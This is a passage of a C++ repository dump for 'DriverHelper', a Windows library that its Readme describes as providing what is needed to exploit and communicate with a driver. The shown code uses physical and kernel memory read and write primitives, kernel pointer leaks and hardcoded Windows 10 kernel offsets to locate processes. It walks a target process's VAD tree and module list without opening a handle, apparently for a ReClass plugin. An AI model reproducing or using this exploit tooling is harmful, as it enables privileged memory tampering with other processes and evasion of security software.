	if (!DriverHelper::ReadVirtualMemory(directoryTableBase, pKProcessAddress + OFFSET_VIRTUALSIZE,
		&(DriverHelper::virtualSizeTargetProcess), sizeof(uintptr_t), NULL))
	{
		std::cout << "[-] Failed trying to obtain the VirtualSize." << std::endl;
		return false;
	}
	std::cout << "\t[+] VirtualSize: 0x" << std::hex << DriverHelper::virtualSizeTargetProcess << std::endl;

	if (!DriverHelper::ReadVirtualMemory(directoryTableBase, pKProcessAddress + OFFSET_VADROOT,
		&(DriverHelper::pVadRootTargetProcess), sizeof(uintptr_t), NULL))
	{
		std::cout << "[-] Failed trying to obtain the VadRoot." << std::endl;
		return false;
	}
	std::cout << "\t[+] VadRoot: 0x" << std::hex << DriverHelper::pVadRootTargetProcess << std::endl;


	if (!DriverHelper::ReadVirtualMemory(directoryTableBase, pKProcessAddress + OFFSET_EPROCESS_PEB,
		&(DriverHelper::pPEBTargetProcess), sizeof(uintptr_t), NULL))
	{
		std::cout << "[-] Failed trying to obtain the PEB." << std::endl;
		return false;
	}
	std::cout << "\t[+] PEB: 0x" << std::hex << DriverHelper::pPEBTargetProcess << std::endl;

	return true;
}



bool DriverHelper::CheckProcessHeader( uintptr_t &directoryTableBase, uintptr_t pBaseAddress)
{
	_IMAGE_DOS_HEADER PEImageHeader = {0};
	
	std::cout << "[+] Checking process header" << std::endl;

	if (!DriverHelper::ReadVirtualMemory(directoryTableBase, pBaseAddress , &PEImageHeader, sizeof(_IMAGE_DOS_HEADER), NULL))
	{
		std::cout << "[-] Failed trying to obtain the IMAGES_DOS_HEADER" << std::endl;
		return false;
	}

	if (PEImageHeader.e_magic != IMAGE_DOS_SIGNATURE)
	{
		std::cout << "[-] Not valid IMAGE_DOS_SIGNATURE found" << std::endl;
		return false;
	}
	std::cout << "\t[+] Valid IMAGE_DOS_SIGNATURE found." << std::endl;

	return true;
}


// Functions that will help us to dump the VadRoot AVL Tree, which has all the memory information about a particular process.

EnumerateRemoteSectionData GetVadNodeInfo(uintptr_t directoryTableBase, uintptr_t node)
{
	/*
	#define OFFSET_STARTINGVPN 0x018
	#define OFFSET_ENDINGVPN 0x01c
	#define OFFSET_STARTINGVPNHIGH 0x020
	#define OFFSET_ENDINGVPNHIGH 0x021
	*/
	uint64_t startingVPNLow = 0;
	uint64_t endingVPNLow = 0;
	uint64_t startingVPNHigh = 0;
	uint64_t endingVPNHigh = 0;
	unsigned long u = 0;

	// Reading the starting and ending VPN.
	DriverHelper::ReadVirtualMemory(directoryTableBase, node + OFFSET_STARTINGVPN, &startingVPNLow, sizeof(uint32_t), NULL);
	DriverHelper::ReadVirtualMemory(directoryTableBase, node + OFFSET_ENDINGVPN, &endingVPNLow, sizeof(uint32_t), NULL);
	DriverHelper::ReadVirtualMemory(directoryTableBase, node + OFFSET_STARTINGVPNHIGH, &startingVPNHigh, sizeof(uint8_t), NULL);
	DriverHelper::ReadVirtualMemory(directoryTableBase, node + OFFSET_ENDINGVPNHIGH, &endingVPNHigh, sizeof(uint8_t), NULL);

	// Reading the unsigned long u from MMVAD_SHORT
	DriverHelper::ReadVirtualMemory(directoryTableBase, node + OFFSET_MMVAD_SHORT_U, &u, sizeof(unsigned long), NULL);

	// We need to put together this two parts, some lshr will doo all the work.
	uint64_t startingVPN = (startingVPNLow << 12) | (startingVPNHigh << 44);
	uint64_t endingVPN = ((endingVPNLow + 1) << 12 | (endingVPNHigh << 44));

	// Let's create the object for our section.
	EnumerateRemoteSectionData section = {};
	section.BaseAddress = (void *)startingVPN;
	section.Size = endingVPN - startingVPN;

	section.Protection = SectionProtection::NoAccess;
	// To get the Protection Flag we need first to obtain the index of the protection from the _MMVAD_FLAGS->Protection
	//		[+0x000 ( 2: 0)] VadType          : 0x2 [Type: unsigned long]
	//		[+0x000 ( 7: 3)] Protection       : 0x7 [Type: unsigned long]
	//		[+0x000 (13: 8)] PreferredNode    : 0x0 [Type: unsigned long]
	//		[+0x000 (14:14)] NoChange         : 0x0 [Type: unsigned long]
	//		[+0x000 (15:15)] PrivateMemory    : 0x0 [Type: unsigned long]
	//    0xF8 == 11111000  <----- Mask to extract bits 7:3
	DWORD protection = (u >> 3) & 0x1F;
	protection = ProtectionFlags[protection];

	if ((protection & PAGE_EXECUTE) == PAGE_EXECUTE) section.Protection |= SectionProtection::Execute;
	if ((protection & PAGE_EXECUTE_READ) == PAGE_EXECUTE_READ) section.Protection |= SectionProtection::Execute | SectionProtection::Read;
	if ((protection & PAGE_EXECUTE_READWRITE) == PAGE_EXECUTE_READWRITE) section.Protection |= SectionProtection::Execute | SectionProtection::Read | SectionProtection::Write;
	if ((protection & PAGE_EXECUTE_WRITECOPY) == PAGE_EXECUTE_WRITECOPY) section.Protection |= SectionProtection::Execute | SectionProtection::Read | SectionProtection::CopyOnWrite;
	if ((protection & PAGE_READONLY) == PAGE_READONLY) section.Protection |= SectionProtection::Read;
	if ((protection & PAGE_READWRITE) == PAGE_READWRITE) section.Protection |= SectionProtection::Read | SectionProtection::Write;
	if ((protection & PAGE_WRITECOPY) == PAGE_WRITECOPY) section.Protection |= SectionProtection::Read | SectionProtection::CopyOnWrite;
	if ((protection & PAGE_GUARD) == PAGE_GUARD) section.Protection |= SectionProtection::Guard;

	//  [+0x000 (15:15)] PrivateMemory    : 0x0 [Type: unsigned long]
	//  [+0x000 (16:16)] PrivateFixup     : 0x0 [Type: unsigned long]
	//  [+0x000 (17:17)] ManySubsections  : 0x0 [Type: unsigned long]
	//  [+0x000 (18:18)] Enclave          : 0x0 [Type: unsigned long]
	//  We need the memory type, we can check with the bit 15 if its private memory
	//  TODO: not mandatory, this is why we see an unknown on the GUI when displaying all the sections.

	return section;
}


// Since we can't open a handle to the process and call VirtualQueryEx
void DriverHelper::WalkVadAVLTree(uintptr_t directoryTableBase, uintptr_t start)
{

	if (start == NULL)
		return;

	// Since we need to traverse a balanced tree, 
	// we first read all the left branches and then we read the right one while we go up again.
	uintptr_t left = 0;
	DriverHelper::ReadVirtualMemory(directoryTableBase, start, &left, sizeof(uintptr_t), NULL);

	// Yep, recursion ;)
	WalkVadAVLTree(directoryTableBase, left);

	// Now the right nodes.
	uintptr_t right = 0;
	DriverHelper::ReadVirtualMemory(directoryTableBase, start + sizeof(uintptr_t), &right, sizeof(uintptr_t), NULL);

	// We need to obtain information from each node: starting and ending address, protection, etc.
	EnumerateRemoteSectionData section = GetVadNodeInfo(directoryTableBase, start);

	// We push that information so we can later notify ReClass.
	DriverHelper::sections.push_back(section);

	// And again recursion
	WalkVadAVLTree(directoryTableBase, right);
}




void DriverHelper::EnumRing3ProcessModules(uintptr_t directoryTableBase)
{

	// Variables used to store lpr pointer and data.
	PEB_LDR_DATA ldr;
	uintptr_t pLDR = 0;

	// We need to dereference the pointer and obtain retrieve the whole LDR structure.
	DriverHelper::ReadVirtualMemory(DriverHelper::DTBTargetProcess, DriverHelper::pPEBTargetProcess + OFFSET_PEB_LDR, &pLDR, sizeof(uintptr_t), NULL);
	DriverHelper::ReadVirtualMemory(DriverHelper::DTBTargetProcess, pLDR, &ldr, sizeof(PEB_LDR_DATA), NULL);

	// InMemoryOrderModuleList will have the head of a linked list.
	// We can traverse the whole list to obtain all the currently loaded modules.
	LIST_ENTRY* head = ldr.InMemoryOrderModuleList.Flink;
	LIST_ENTRY* next = head;

	PLDR_MODULE pLdrModule = nullptr;
	LDR_MODULE LdrModule;
	do
	{
		LDR_DATA_TABLE_ENTRY LdrEntry;
		LDR_DATA_TABLE_ENTRY* Base = CONTAINING_RECORD(head, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

		if (DriverHelper::ReadVirtualMemory(DriverHelper::DTBTargetProcess, (uintptr_t)Base, &LdrEntry, sizeof(LdrEntry), NULL))
		{
			char* pLdrModuleOffset = reinterpret_cast<char*>(head) - sizeof(LIST_ENTRY);

			// Obtaining module pointer
			DriverHelper::ReadVirtualMemory(DriverHelper::DTBTargetProcess, (uintptr_t)pLdrModuleOffset, &pLdrModule, sizeof(pLdrModule), NULL);
			// Retrieven module information
			DriverHelper::ReadVirtualMemory(DriverHelper::DTBTargetProcess, (uintptr_t)pLdrModule, &LdrModule, sizeof(LdrModule), NULL);

			if (LdrEntry.DllBase)
			{
				//std::wstring fullname = LdrModule.FullDllName;

				// Retrieve the FullDllName
				WCHAR strFullDllName[MAX_PATH] = { 0 };
				if (DriverHelper::ReadVirtualMemory(DriverHelper::DTBTargetProcess,
					reinterpret_cast<uintptr_t>(LdrModule.FullDllName.Buffer),
					&strFullDllName,
					LdrModule.FullDllName.Length, NULL))
				{
					// We create the EnumerateRemoteModuleData so we can return it to ReClass
					EnumerateRemoteModuleData module = {};

					// Debuging code :P
					// wprintf(L"Full Dll Name: %s\n", strFullDllName);
					// std::cout<< "BaseAddress:     " << LdrModule.BaseAddress<<std::endl;

					module.BaseAddress = LdrModule.BaseAddress;
					std::copy(strFullDllName, strFullDllName + MAX_PATH, module.Path);
					module.Size = LdrModule.SizeOfImage;

					// We push the current module into the vecto we later use to notify ReClass
					DriverHelper::modules.push_back(module);
				}
			}

			head = LdrEntry.InMemoryOrderLinks.Flink;
		}
	} while (head != next);

	return;
}
```

`DriverHelper/DriverHelper.h`:

```h
#pragma once
#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <winternl.h>
#include <ntstatus.h>
#include <vector>

#pragma comment( lib, "ntdll.lib" )

// IMPORTANT!!! You need to set up this constant to the windows version
// you are going to compile it for.
#define WINVERSION 1607

// Kernel offsets (used for Read Write kernel memory)
#define OFFSET_DIRECTORYTABLEBASE 0x028
#define OFFSET_VIRTUALSIZE 0x338
#define OFFSET_SECTIONBASEADDRESS 0x3c0
#define OFFSET_OBJECTTABLE 0x418
#define OFFSET_IMAGEFILENAME 0x450
#define OFFSET_PRIORITYCLASS 0x45f

// Kernel offsets (used for enumerate modules and sections of a process using kernel memory) w10 1607
#define OFFSET_EPROCESS_PEB 0x3f8
#define OFFSET_PEB_LDR 0x018
#define OFFSET_LDR_InMemoryOrderModuleList 0x20

#if (WINVERSION == 1607)
#define OFFSET_ACTIVEPROCESSLINKS 0x2f0
#define OFFSET_UNIQUEPROCESSID 0x2e8
#define OFFSET_VADROOT 0x620
#endif


#if (WINVERSION == 1703 || WINVERSION == 1709)
#define OFFSET_ACTIVEPROCESSLINKS 0x2e8
#define OFFSET_UNIQUEPROCESSID 0x2e0
#define OFFSET_VADROOT 0x628
#endif



/*
(*((ntkrnlmp!_MMVAD_SHORT *)0xffffb803e0fa73a0))                 [Type: _MMVAD_SHORT]
	[+0x000] VadNode          [Type: _RTL_BALANCED_NODE]
	[+0x000] NextVad          : 0xffffb803dfc39240 [Type: _MMVAD_SHORT *]
	[+0x018] StartingVpn      : 0x96ee040 [Type: unsigned long]
	[+0x01c] EndingVpn        : 0x96ee13f [Type: unsigned long]
	[+0x020] StartingVpnHigh  : 0x0 [Type: unsigned char]
	[+0x021] EndingVpnHigh    : 0x0 [Type: unsigned char]

*/
#define OFFSET_STARTINGVPN 0x018
#define OFFSET_ENDINGVPN 0x01c
#define OFFSET_STARTINGVPNHIGH 0x020
#define OFFSET_ENDINGVPNHIGH 0x021
#define OFFSET_MMVAD_SHORT_U 0x030


const ULONG ProtectionFlags[] = {
	PAGE_NOACCESS,
	PAGE_READONLY,
	PAGE_EXECUTE,
	PAGE_EXECUTE_READ,
	PAGE_READWRITE,
	PAGE_WRITECOPY,
	PAGE_EXECUTE_READWRITE,
	PAGE_EXECUTE_WRITECOPY,
	PAGE_NOACCESS,
	PAGE_NOCACHE | PAGE_READONLY,
	PAGE_NOCACHE | PAGE_EXECUTE,
	PAGE_NOCACHE | PAGE_EXECUTE_READ,
	PAGE_NOCACHE | PAGE_READWRITE,
	PAGE_NOCACHE | PAGE_WRITECOPY,
	PAGE_NOCACHE | PAGE_EXECUTE_READWRITE,
	PAGE_NOCACHE | PAGE_EXECUTE_WRITECOPY,
	PAGE_NOACCESS,
	PAGE_GUARD | PAGE_READONLY,
	PAGE_GUARD | PAGE_EXECUTE,
	PAGE_GUARD | PAGE_EXECUTE_READ,
	PAGE_GUARD | PAGE_READWRITE,
	PAGE_GUARD | PAGE_WRITECOPY,
	PAGE_GUARD | PAGE_EXECUTE_READWRITE,
	PAGE_GUARD | PAGE_EXECUTE_WRITECOPY,
	PAGE_NOACCESS,
	PAGE_WRITECOMBINE | PAGE_READONLY,
	PAGE_WRITECOMBINE | PAGE_EXECUTE,
	PAGE_WRITECOMBINE | PAGE_EXECUTE_READ,
	PAGE_WRITECOMBINE | PAGE_READWRITE,
	PAGE_WRITECOMBINE | PAGE_WRITECOPY,
	PAGE_WRITECOMBINE | PAGE_EXECUTE_READWRITE,
	PAGE_WRITECOMBINE | PAGE_EXECUTE_WRITECOPY,
};


typedef BOOL (*_fn_memcpy)(ULONG64 dest, ULONG64 src, DWORD size);
typedef ULONG64(*_fn_mapPhysical)(DWORDLONG physicaladdress, DWORD size);
typedef ULONG64(*_fn_unmapPhysical)(ULONG64 address);

// Remove padding inside structs
#pragma pack(push, 1) 
typedef struct {
	CHAR  ImageFileName[15];
	DWORD PriorityClass;
} _EPROCESS_PATTERN;


// Structure of MAP
typedef struct _READ_REQUEST {
	DWORD InterfaceType;
	DWORD Bus;
	ULONG64 PhysicalAddress;
	DWORD IOSpace;
	DWORD size;
} READ_REQUEST;

typedef struct _WRITE_REQUEST {
	DWORDLONG address;
	DWORD length;
	DWORDLONG buffer;
} WRITE_REQUEST;

typedef struct _MEMCPY_REQUEST {
	ULONG64 dest;
	ULONG64 src;
	DWORD size;
} MEMCPY_REQUEST;



// Kernel Structures
typedef struct _HANDLE_TABLE_ENTRY
{
	ULONGLONG Value;
	ULONGLONG GrantedAccess : 25;
} HANDLE_TABLE_ENTRY, *PHANDLE_TABLE_ENTRY;

typedef struct _HANDLE_TABLE
{
	CHAR fill[100];
} HANDLE_TABLE, *PHANDLE_TABLE;


struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX			// Size => 28
{
	PVOID Object;									// Size => 4 Offset =>0
	ULONG UniqueProcessId;							// Size => 4 Offset =>4
	ULONG HandleValue;								// Size => 4 Offset =>8
	ULONG GrantedAccess;							// Size => 4 Offset =>12
	USHORT CreatorBackTraceIndex;					// Size => 2 Offset =>16
	USHORT ObjectTypeIndex;							// Size => 2 Offset =>18
	ULONG HandleAttributes;							// Size => 4 Offset =>20
	ULONG Reserved;									// Size => 4 Offset =>24
};

struct SYSTEM_HANDLE_INFORMATION_EX					// Size => 36
{
	ULONG NumberOfHandles;							// Size => 4 Offset => 0
	ULONG Reserved;									// Size => 4 Offset => 4
	SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];	// Size => 36 Offset => 8
};


typedef struct _LDR_MODULE
{
	LIST_ENTRY      InLoadOrderModuleList;
	LIST_ENTRY      InMemoryOrderModuleList;
	LIST_ENTRY      InInitializationOrderModuleList;
	PVOID           BaseAddress;
	PVOID           EntryPoint;
	ULONG           SizeOfImage;
	UNICODE_STRING  FullDllName;
	UNICODE_STRING  BaseDllName;
	ULONG           Flags;
	SHORT           LoadCount;
	SHORT           TlsIndex;
	LIST_ENTRY      HashTableEntry;
	ULONG           TimeDateStamp;
} LDR_MODULE, *PLDR_MODULE;


// Custom structs from ReClass (this is the information we store from each section/module)
const int PATH_MAXIMUM_LENGTH = 260;
using RC_Pointer = void*;
using RC_Size = size_t;
using RC_UnicodeChar = char16_t;

enum class SectionProtection
{
	NoAccess = 0,

	Read = 1,
	Write = 2,
	CopyOnWrite = 4,
	Execute = 8,

	Guard = 16
};

inline SectionProtection operator|(SectionProtection lhs, SectionProtection rhs)
{
	using T = std::underlying_type_t<SectionProtection>;

	return static_cast<SectionProtection>(static_cast<T>(lhs) | static_cast<T>(rhs));
}

inline SectionProtection& operator|=(SectionProtection& lhs, SectionProtection rhs)
{
	using T = std::underlying_type_t<SectionProtection>;

	lhs = static_cast<SectionProtection>(static_cast<T>(lhs) | static_cast<T>(rhs));

	return lhs;
}


struct EnumerateRemoteSectionData
{
	RC_Pointer BaseAddress;
	RC_Size Size;
	//SectionType Type;
	//SectionCategory Category;
	SectionProtection Protection;
	RC_UnicodeChar Name[16];
	RC_UnicodeChar ModulePath[PATH_MAXIMUM_LENGTH];
};

struct EnumerateRemoteModuleData
{
	RC_Pointer BaseAddress;
	RC_Size Size;
	RC_UnicodeChar Path[PATH_MAXIMUM_LENGTH];
};


class DriverHelper
{
public:
	static int memmem(PBYTE haystack, DWORD haystack_size, PBYTE needle, DWORD needle_size);
	static int getDeviceHandle(LPTSTR name);
	static unsigned __int64 __fastcall ExpLookupHandleTableEntryW7(__int64 HandleTable, unsigned __int64 handle);
	static unsigned __int64 __fastcall ExpLookupHandleTableEntryW10(__int64 HandleTable, __int64 handle);
	static ULONG64 findPhisical_ObjectTable(DWORDLONG startAddress, DWORDLONG stopAddress, DWORD searchSpace, PBYTE  searchBuffer, DWORD bufferSize);
	static DWORDLONG findPhisical(DWORDLONG startAddress, DWORDLONG stopAddress, DWORD searchSpace, PBYTE  searchBuffer, DWORD bufferSize);
	static bool LeakKernelPointers(std::vector<uintptr_t> &pKernelPointers);
	static uintptr_t FindDirectoryBase();
	static uint64_t VAtoPhylAddress(uint64_t directoryTableBase, LPVOID virtualAddress);
	static bool ReadVirtualMemory(uint64_t directoryTableBase, uintptr_t virtualAddress, LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesRead);
	static bool WriteVirtualMemory(uint64_t directoryTableBase, uintptr_t virtualAddress, LPVOID  lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesWritten);
	static uintptr_t ObtainKProcessPointer(uint64_t directoryTableBase, std::vector<uintptr_t> pKernelPointers);
	static uintptr_t GetKProcess(uintptr_t &directoryTableBase);
	static uintptr_t SearchKProcess(LPCVOID processName, uintptr_t &directoryTableBase, uintptr_t pKProcess);
	static bool ReadPhyMemory( uintptr_t physicalAddress, LPVOID  lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesRead);
	static bool WritePhyMemory( uintptr_t physicalAddress, LPVOID  lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesWritten);
	static bool CheckProcessHeader(uintptr_t &directoryTableBase, uintptr_t pKProcessAddress);
	static bool ObtainKProcessInfo(uintptr_t &directoryTableBase, uintptr_t pKProcessAddress);
	// Developed for DriverReader (ReClass Plugin)
	static void WalkVadAVLTree(uintptr_t directoryTableBase, uintptr_t start);
	static void EnumRing3ProcessModules(uintptr_t directoryTableBase);


	// Variables
	static HANDLE hDeviceDrv;
	static _fn_memcpy fn_memcpy;
	static _fn_mapPhysical fn_mapPhysical;
	static _fn_unmapPhysical fn_unmapPhysical;
	static uintptr_t DTBTargetProcess;
	static uintptr_t virtualSizeTargetProcess;
	static uintptr_t pBaseAddressTargetProcess;

	// Developed for DriverReader (ReClass Plugin)
	static uintptr_t pVadRootTargetProcess;
	static uintptr_t pPEBTargetProcess;
	static std::vector<EnumerateRemoteSectionData> sections;
	static std::vector<EnumerateRemoteModuleData> modules;

private:

};
```

`DriverHelper/DriverHelper.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{36244BA2-D910-4746-8ED2-7CFA55FB4DE9}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>DriverHelper</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17763.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <AdditionalIncludeDirectories>$(SolutionDir)DriverHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;NDEBUG;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="DriverHelper.h" />
    <ClInclude Include="stdafx.h" />
    <ClInclude Include="targetver.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="DriverHelper.cpp" />
    <ClCompile Include="stdafx.cpp">
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">Create</PrecompiledHeader>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="Readme.md" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`DriverHelper/DriverHelper.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="stdafx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="targetver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="DriverHelper.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="stdafx.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="DriverHelper.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="Readme.md" />
  </ItemGroup>
</Project>
```

`DriverHelper/Readme.md`:

```md
# DriverHelper

## Introduction


## Usage

This module provides all key features required to exploit and communicate with a Driver.

## Key Features

Class DriverHelper will provide the following method:

- static int memmem(PBYTE haystack, DWORD haystack_size, PBYTE needle, DWORD needle_size);
- static int getDeviceHandle(LPTSTR name);
- static unsigned __int64 __fastcall ExpLookupHandleTableEntryW7(__int64 HandleTable, unsigned __int64 handle);
- static unsigned __int64 __fastcall ExpLookupHandleTableEntryW10(__int64 HandleTable, __int64 handle);
